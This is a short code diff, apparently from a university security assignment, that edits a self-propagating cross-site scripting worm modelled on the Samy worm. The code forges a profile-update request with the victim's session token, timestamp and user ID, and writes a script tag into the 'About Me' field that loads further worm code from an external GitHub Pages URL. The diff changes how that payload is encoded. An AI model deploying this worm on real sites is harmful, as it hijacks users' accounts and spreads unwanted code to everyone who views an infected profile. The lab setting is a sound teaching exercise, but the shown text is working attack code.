@@ -9,7 +9,7 @@ window.onload = function(){
     var wormCode = '<script src="https://arminruckstuhl.github.io/CYBR271_Assignment3/script2.js"></script>';
 
     // Construct the content of your URL, updating the "About Me" field with the worm code
-    var content = token + ts + userName + "&description=" + encodeURIComponent("Samy waz here! " + wormCode) + "&accesslevel[description]=2" + guid;
+    var content = token + ts + userName + "&description=" + "Samy waz here" + wormCode + "&accesslevel[description]=2" + guid;
 
     var samyGuid = 59; // Samy's user ID
 
